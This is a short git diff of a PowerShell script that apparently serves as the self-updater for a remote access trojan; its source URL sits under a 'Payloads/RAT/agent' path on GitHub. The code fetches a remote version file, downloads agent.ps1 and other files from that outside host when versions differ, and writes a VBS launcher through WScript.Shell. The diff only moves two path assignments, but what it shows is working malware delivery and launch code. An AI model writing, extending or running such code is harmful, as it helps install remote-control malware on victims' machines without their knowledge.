@@ -3,7 +3,7 @@ $baseUrl = "https://raw.githubusercontent.com/Red-Ducky/Payloads/main/RAT/agent/
 $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
 $playerPath = Join-Path $scriptDir "player.py"
 
-############################ TEST UPDATE #####################################
+################### UPDATED ###########################
 
 $remote = Invoke-RestMethod -Uri $versionUrl
 
@@ -16,6 +16,9 @@ if (Test-Path $localPath) {
 } else {
     $local = @{ agent_version = "0.0"; files = @() }
 }
+
+$agentPath = Join-Path $scriptDir "agent.ps1"
+$vbsPath = Join-Path $scriptDir "launcher.vbs"
 
 if ($remote.agent_version -ne $local.agent_version) {
     Invoke-WebRequest -Uri ($baseUrl + "agent.ps1") -OutFile (Join-Path $scriptDir "agent.ps1")
@@ -32,8 +35,6 @@ if ($remote.agent_version -ne $local.agent_version) {
         }
     }
     $remote | ConvertTo-Json | Set-Content $localPath
-    $agentPath = Join-Path $scriptDir "agent.ps1"
-    $vbsPath = Join-Path $scriptDir "launcher.vbs"
 
 @"
 Set objShell = CreateObject("WScript.Shell")
